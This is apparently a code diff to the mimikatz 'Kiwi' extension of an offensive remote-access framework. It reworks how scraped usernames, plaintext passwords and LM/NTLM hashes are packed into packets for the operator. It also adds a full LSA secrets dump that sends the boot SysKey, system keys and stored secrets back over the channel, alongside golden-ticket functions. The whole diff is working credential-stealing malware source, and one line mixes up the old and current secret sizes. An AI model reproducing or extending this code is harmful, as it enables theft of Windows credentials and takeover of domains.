@@ -2,6 +2,16 @@
 #include "mimikatz_interface.h"
 #include <NTSecAPI.h>
 
+// dirty hackes to get things to build
+// copied from crypto_system
+#define	MD4_DIGEST_LENGTH	16
+#define	MD5_DIGEST_LENGTH	16
+#define SHA_DIGEST_LENGTH	20
+// copied from globals
+#define LM_NTLM_HASH_LENGTH	16
+
+#include "modules\kuhl_m_lsadump_struct.h"
+
 typedef void (CALLBACK * PKUHL_M_SEKURLSA_EXTERNAL) (IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain, IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData);
 typedef LONG (* PKUHL_M_SEKURLSA_ENUMERATOR)(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
 
@@ -12,6 +22,7 @@ extern LONG kuhl_m_sekurlsa_kerberos_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LP
 extern LONG kuhl_m_sekurlsa_tspkg_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
 extern LONG kuhl_m_sekurlsa_livessp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
 extern LONG kuhl_m_sekurlsa_ssp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
+extern LONG kuhl_m_lsadump_full(PLSA_CALLBACK_CTX callbackCtx);
 
 // TODO:
 //extern LONG kuhl_m_sekurlsa_tickets_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
@@ -20,17 +31,20 @@ extern LONG kuhl_m_sekurlsa_ssp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID 
 extern LONG kuhl_m_kerberos_use_ticket(PBYTE fileData, DWORD fileSize);
 extern LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWCHAR szSid, PCWCHAR szNtlm, PBYTE* ticketBuffer, DWORD* ticketBufferSize);
 
-const wchar_t* EmptyString = L"";
+BOOL is_unicode_string(DWORD dwBytes, LPVOID pSecret)
+{
+	UNICODE_STRING candidateString = { (USHORT)dwBytes, (USHORT)dwBytes, (PWSTR)pSecret };
+	int unicodeTestFlags = IS_TEXT_UNICODE_ODD_LENGTH | IS_TEXT_UNICODE_STATISTICS;
+	return pSecret && IsTextUnicode(candidateString.Buffer, candidateString.Length, &unicodeTestFlags);
+}
 
 void CALLBACK handle_result(IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain,
 	IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData)
 {
 	UINT hi = 0;
 	UINT lo = 0;
-	char ntlmHash[33];
-	char lmHash[33];
 
-	DWORD i;
+	DWORD count = 0;
 	Tlv entries[7];
 	Packet* packet = (Packet*)pvData;
 
@@ -39,43 +53,31 @@ void CALLBACK handle_result(IN CONST PLUID luid, IN CONST PUNICODE_STRING userna
 	if (username != NULL && username->Buffer != NULL && username->Length > 0)
 	{
 		dprintf("[KIWI] Adding username %u chars", username->Length);
-		packet_add_tlv_wstring_entry(&entries[0], TLV_TYPE_KIWI_PWD_USERNAME, username->Buffer, username->Length);
-	}
-	else
-	{
-		dprintf("[KIWI] Adding blank username");
-		packet_add_tlv_wstring_entry(&entries[0], TLV_TYPE_KIWI_PWD_USERNAME, EmptyString, 0);
+		packet_add_tlv_wstring_entry(&entries[count++], TLV_TYPE_KIWI_PWD_USERNAME, username->Buffer, username->Length);
 	}
 
 	if (domain != NULL && domain->Buffer != NULL && domain->Length > 0)
 	{
 		dprintf("[KIWI] Adding domain %u chars", domain->Length);
-		packet_add_tlv_wstring_entry(&entries[1], TLV_TYPE_KIWI_PWD_DOMAIN, domain->Buffer, domain->Length);
-	}
-	else
-	{
-		dprintf("[KIWI] Adding blank domain");
-		packet_add_tlv_wstring_entry(&entries[1], TLV_TYPE_KIWI_PWD_DOMAIN, EmptyString, 0);
+		packet_add_tlv_wstring_entry(&entries[count++], TLV_TYPE_KIWI_PWD_DOMAIN, domain->Buffer, domain->Length);
 	}
 
 	if (password != NULL && password->Buffer != NULL && password->Length > 0)
 	{
 		dprintf("[KIWI] Adding password %u chars", password->Length);
-		packet_add_tlv_wstring_entry(&entries[2], TLV_TYPE_KIWI_PWD_PASSWORD, password->Buffer, password->Length);
-	}
-	else
-	{
-		dprintf("[KIWI] Adding blank password");
-		packet_add_tlv_wstring_entry(&entries[2], TLV_TYPE_KIWI_PWD_PASSWORD, EmptyString, 0);
+		packet_add_tlv_wstring_entry(&entries[count++], TLV_TYPE_KIWI_PWD_PASSWORD, password->Buffer, password->Length);
 	}
 
 	dprintf("[KIWI] Adding auth info");
-	entries[3].header.length = sizeof(UINT);
-	entries[3].header.type = TLV_TYPE_KIWI_PWD_AUTH_HI;
-	entries[3].buffer = (PUCHAR)&hi;
-	entries[4].header.length = sizeof(UINT);
-	entries[4].header.type = TLV_TYPE_KIWI_PWD_AUTH_LO;
-	entries[4].buffer = (PUCHAR)&lo;
+	entries[count].header.length = sizeof(UINT);
+	entries[count].header.type = TLV_TYPE_KIWI_PWD_AUTH_HI;
+	entries[count].buffer = (PUCHAR)&hi;
+	++count;
+
+	entries[count].header.length = sizeof(UINT);
+	entries[count].header.type = TLV_TYPE_KIWI_PWD_AUTH_LO;
+	entries[count].buffer = (PUCHAR)&lo;
+	++count;
 
 	if (luid != NULL)
 	{
@@ -86,48 +88,25 @@ void CALLBACK handle_result(IN CONST PLUID luid, IN CONST PUNICODE_STRING userna
 	// 16 bytes long
 	if (lm != NULL)
 	{
-		sprintf_s(lmHash, sizeof(lmHash), "%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
-			lm[0], lm[1], lm[2], lm[3], lm[4], lm[5], lm[6], lm[7], lm[8],
-			lm[9], lm[10], lm[11], lm[12], lm[13], lm[14], lm[15]);
-		dprintf("[KIWI] Adding lm hash: %s", lmHash);
-		entries[5].header.length = sizeof(lmHash);
-		entries[5].header.type = TLV_TYPE_KIWI_PWD_LMHASH;
-		entries[5].buffer = (PUCHAR)lmHash;
-	}
-	else
-	{
-		dprintf("[KIWI] Adding blank lm");
-		packet_add_tlv_wstring_entry(&entries[5], TLV_TYPE_KIWI_PWD_LMHASH, EmptyString, 0);
+		dprintf("[KIWI] Adding lm hash");
+		entries[count].header.length = 16;
+		entries[count].header.type = TLV_TYPE_KIWI_PWD_LMHASH;
+		entries[count].buffer = (PUCHAR)lm;
+		++count;
 	}
 
 	// 16 bytes long
 	if (ntlm != NULL)
 	{
-		sprintf_s(ntlmHash, sizeof(ntlmHash), "%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
-			ntlm[0], ntlm[1], ntlm[2], ntlm[3], ntlm[4], ntlm[5], ntlm[6], ntlm[7], ntlm[8],
-			ntlm[9], ntlm[10], ntlm[11], ntlm[12], ntlm[13], ntlm[14], ntlm[15]);
-		dprintf("[KIWI] Adding ntlm hash: %s", ntlmHash);
-		entries[6].header.length = sizeof(ntlmHash);
-		entries[6].header.type = TLV_TYPE_KIWI_PWD_NTLMHASH;
-		entries[6].buffer = (PUCHAR)ntlmHash;
-	}
-	else
-	{
-		dprintf("[KIWI] Adding blank ntlm");
-		packet_add_tlv_wstring_entry(&entries[6], TLV_TYPE_KIWI_PWD_NTLMHASH, EmptyString, 0);
+		dprintf("[KIWI] Adding ntlm hash");
+		entries[count].header.length = 16;
+		entries[count].header.type = TLV_TYPE_KIWI_PWD_NTLMHASH;
+		entries[count].buffer = (PUCHAR)ntlm;
+		++count;
 	}
 
 	dprintf("[KIWI] Adding to packet");
-	packet_add_tlv_group(packet, TLV_TYPE_KIWI_PWD_RESULT, entries, 7);
-
-	dprintf("[KIWI] Freeing buffers");
-	for (i = 0; i < 3; ++i)
-	{
-		if (entries[i].buffer != NULL)
-		{
-			free(entries[i].buffer);
-		}
-	}
+	packet_add_tlv_group(packet, TLV_TYPE_KIWI_PWD_RESULT, entries, count);
 }
 
 DWORD mimikatz_scrape_passwords(DWORD cmdId, Packet* packet)
@@ -246,4 +225,150 @@ DWORD mimikatz_golden_ticket_create(char* user, char* domain, char* sid, char* t
 DWORD mimikatz_golden_ticket_use(BYTE* buffer, DWORD bufferSize)
 {
 	return kuhl_m_kerberos_use_ticket(buffer, bufferSize);
+}
+
+
+VOID PolicyVersionHandler(LPVOID lpContext, USHORT usMajor, USHORT usMinor)
+{
+	Packet *response = (Packet*)lpContext;
+
+	dprintf("[KIWI LSA] Version: %u.%u", usMajor, usMinor);
+
+	packet_add_tlv_uint(response, TLV_TYPE_KIWI_LSA_VER_MAJ, (UINT)usMajor);
+	packet_add_tlv_uint(response, TLV_TYPE_KIWI_LSA_VER_MIN, (UINT)usMinor);
+}
+
+VOID Nt5KeyHandler(LPVOID lpContext, DWORD dwIndex, PNT5_SYSTEM_KEY pSysKey)
+{
+	Packet *response = (Packet*)lpContext;
+	dprintf("[KIWI LSA] nt5 Key");
+	packet_add_tlv_raw(response, TLV_TYPE_KIWI_LSA_NT5KEY, pSysKey->key, sizeof(NT5_SYSTEM_KEY));
+}
+
+VOID Nt6KeyHandler(LPVOID lpContext, DWORD dwIndex, PNT6_SYSTEM_KEY pSysKey)
+{
+	Tlv entities[3];
+	Packet *response = (Packet*)lpContext;
+	UINT uKeySize = htonl(pSysKey->KeySize);
+
+	dprintf("[KIWI LSA] nt6 Key");
+
+	dwIndex = htonl(dwIndex);
+	entities[0].header.type = TLV_TYPE_KIWI_LSA_KEYIDX;
+	entities[0].header.length = sizeof(UINT);
+	entities[0].buffer = (PUCHAR)&dwIndex;
+
+	entities[1].header.type = TLV_TYPE_KIWI_LSA_KEYID;
+	entities[1].header.length = sizeof(GUID);
+	entities[1].buffer = (PUCHAR)&pSysKey->KeyId;
+
+	entities[2].header.type = TLV_TYPE_KIWI_LSA_KEYVALUE;
+	entities[2].header.length = pSysKey->KeySize;
+	entities[2].buffer = (PUCHAR)pSysKey->Key;
+
+	packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_NT6KEY, entities, 3);
+}
+
+VOID Nt6KeyStreamHandler(LPVOID lpContext, PNT6_SYSTEM_KEYS pSysKeyStream)
+{
+	Packet *response = (Packet*)lpContext;
+	dprintf("[KIWI LSA] nt6 Key stream: %u keys", pSysKeyStream->nbKeys);
+	packet_add_tlv_uint(response, TLV_TYPE_KIWI_LSA_KEYCOUNT, pSysKeyStream->nbKeys);
+}
+
+VOID CompNameHandler(LPVOID lpContext, wchar_t* lpwComputerName)
+{
+	Packet *response = (Packet*)lpContext;
+	dprintf("[KIWI LSA] Computer Name: %S", lpwComputerName);
+	packet_add_tlv_wstring(response, TLV_TYPE_KIWI_LSA_COMPNAME, lpwComputerName);
+}
+
+VOID SysKeyHandler(LPVOID lpContext, LPBYTE pKey, DWORD dwKeyLen)
+{
+	Packet *response = (Packet*)lpContext;
+	dprintf("[KIWI LSA] SysKey: %u bytes", dwKeyLen);
+	packet_add_tlv_raw(response, TLV_TYPE_KIWI_LSA_SYSKEY, pKey, dwKeyLen);
+}
+
+VOID SecretHandler(LPVOID lpContext, wchar_t* lpwSecretName, wchar_t* lpwServiceInfo, LPBYTE pMd4Digest, LPVOID pCurrent, DWORD dwCurrentSize, LPVOID pOld, DWORD dwOldSize)
+{
+	Tlv entries[5];
+	DWORD dwCount = 0;
+	Packet *response = (Packet*)lpContext;
+	dprintf("[KIWI LSA] Handling secret: %S", lpwSecretName);
+
+	// don't bother with the entry if we don't have data for it
+	if (!pCurrent && !pOld)
+	{
+		dprintf("[KIWI LSA] Secret has no data: %S", lpwSecretName);
+		return;
+	}
+
+	packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_LSA_SECRET_NAME, lpwSecretName, 0);
+
+	if (lpwServiceInfo)
+	{
+		packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_LSA_SECRET_SERV, lpwServiceInfo, 0);
+	}
+
+	if (pMd4Digest)
+	{
+		entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SECRET_NTLM;
+		entries[dwCount].header.length = MD4_DIGEST_LENGTH;
+		entries[dwCount].buffer = (PUCHAR)pMd4Digest;
+		++dwCount;
+	}
+
+	if (pCurrent)
+	{
+		if (is_unicode_string(dwCurrentSize, pCurrent))
+		{
+			dprintf("[KIWI LSA] current text");
+			packet_add_tlv_wstring_entry(&entries[dwCount], TLV_TYPE_KIWI_LSA_SECRET_CURR, (LPCWSTR)pCurrent, dwCurrentSize / sizeof(wchar_t));
+		}
+		else
+		{
+			dprintf("[KIWI LSA] current raw");
+			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SECRET_CURR_RAW;
+			entries[dwCount].header.length = dwCurrentSize;
+			entries[dwCount].buffer = (PUCHAR)pCurrent;
+		}
+		++dwCount;
+	}
+
+	if (pOld)
+	{
+		if (is_unicode_string(dwOldSize, pOld))
+		{
+			packet_add_tlv_wstring_entry(&entries[dwCount], TLV_TYPE_KIWI_LSA_SECRET_OLD, (LPCWSTR)pOld,  dwCurrentSize / sizeof(wchar_t));
+		}
+		else
+		{
+			entries[dwCount].header.type = TLV_TYPE_KIWI_LSA_SECRET_OLD_RAW;
+			entries[dwCount].header.length = dwOldSize;
+			entries[dwCount].buffer = (PUCHAR)pOld;
+		}
+		++dwCount;
+	}
+
+	packet_add_tlv_group(response, TLV_TYPE_KIWI_LSA_SECRET, entries, dwCount);
+}
+
+DWORD mimikatz_lsa_dump_secrets(Packet* response)
+{
+	LSA_CALLBACK_CTX callbackCtx;
+	ZeroMemory(&callbackCtx, sizeof(callbackCtx));
+
+	// we want the context to be the packet, so that elements
+	// can be added directly to the packet
+	callbackCtx.lpContext = response;
+	callbackCtx.pCompNameHandler = CompNameHandler;
+	callbackCtx.pSysKeyHandler = SysKeyHandler;
+	callbackCtx.pPolicyVersionHandler = PolicyVersionHandler;
+	callbackCtx.pNt6KeyStreamHandler = Nt6KeyStreamHandler;
+	callbackCtx.pNt6KeyHandler = Nt6KeyHandler;
+	callbackCtx.pNt5KeyHandler = Nt5KeyHandler;
+	callbackCtx.pSecretHandler = SecretHandler;
+
+	return kuhl_m_lsadump_full(&callbackCtx);
 }
